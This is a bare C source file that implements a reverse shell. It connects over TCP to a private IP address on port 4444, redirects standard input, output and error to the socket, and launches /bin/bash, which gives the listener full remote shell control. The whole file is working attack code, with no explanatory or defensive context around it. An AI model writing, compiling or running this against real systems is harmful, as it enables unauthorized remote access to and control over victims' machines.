#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>


void main()
{

struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(4444); // Port
addr.sin_addr.s_addr = inet_addr("192.168.230.169");


int sock = socket(AF_INET, SOCK_STREAM, 0);

connect(sock, (struct sockaddr *)&addr, sizeof(addr));

 dup2(sock, 0);
 dup2(sock, 1);
 dup2(sock, 2);

 execve("/bin/bash", NULL, NULL);

}
